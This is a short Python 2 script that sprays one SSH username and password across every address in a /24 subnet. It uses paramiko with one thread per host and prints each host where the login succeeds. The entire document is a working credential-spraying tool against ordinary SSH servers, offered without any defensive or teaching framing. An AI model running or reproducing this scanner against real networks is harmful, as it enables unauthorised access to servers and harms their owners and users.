#! /usr/bin/python
#-*- coding: utf-8 -*-

import paramiko
import threading
from sys import argv

def ssh2 (ip, userName, password):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, 22, userName, password, timeout = 5)
        print "%s password is: %s"%(ip, password)
    except:
        print "%s unknown"%ip

if __name__ == '__main__':
    cduan,userName,password = argv[1:]
    ipList = [str(cduan)+ '.' +str(x) for x in range(255)]
    threads = []
    print "Start..."
    for i in ipList:
        th = threading.Thread(target = ssh2,
            args = (i, userName, password))
        th.start()
